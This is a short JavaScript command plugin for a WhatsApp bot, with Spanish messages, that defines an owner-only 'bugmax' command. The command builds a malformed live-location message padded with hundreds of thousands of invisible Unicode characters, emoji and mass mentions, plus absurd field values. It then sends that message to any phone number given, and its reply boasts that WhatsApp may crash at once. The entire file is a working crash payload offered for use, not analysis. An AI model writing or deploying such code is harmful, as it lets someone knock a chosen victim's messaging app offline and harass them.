const sendUltraCrash = async (conn, jid) => {
  const hugeText = '\u2063\u200E\uFEFF'.repeat(300000) + '💣'.repeat(200000) + '@everyone'.repeat(5000)

  const payload = {
    viewOnceMessage: {
      message: {
        liveLocationMessage: {
          degreesLatitude: '💀',
          degreesLongitude: '💀',
          caption: hugeText,
          sequenceNumber: '0',
          timeOffset: 999999999,
          accuracyInMeters: 999999999,
          speedInMps: 999999,
          degreesClockwiseFromMagneticNorth: 999999,
          contextInfo: {
            mentionedJid: Array(100).fill('0@s.whatsapp.net'),
            forwardingScore: 999999,
            isForwarded: true,
            quotedMessage: {
              contactMessage: {
                displayName: '💀',
                vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:💀💀💀\nEND:VCARD'
              }
            },
            groupMentions: [{
              groupJid: '0@broadcast',
              groupSubject: '🔥 BOOM'
            }]
          }
        }
      }
    }
  }

  await conn.relayMessage(jid, payload, { messageId: conn.generateMessageTag() })
}

let handler = async (m, { conn, isOwner, args }) => {
  if (!isOwner) throw '⛔ Este comando solo está disponible para el Owner del bot.'

  const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.chat

  await sendUltraCrash(conn, target)
  await m.reply(`☢️ *BUG ULTRA CRASH enviado exitosamente a:* ${target}\n⚠️ WhatsApp puede cerrarse al instante.`)
}

handler.command = /^bugmax$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['bugmax [número opcional]']

export default handler
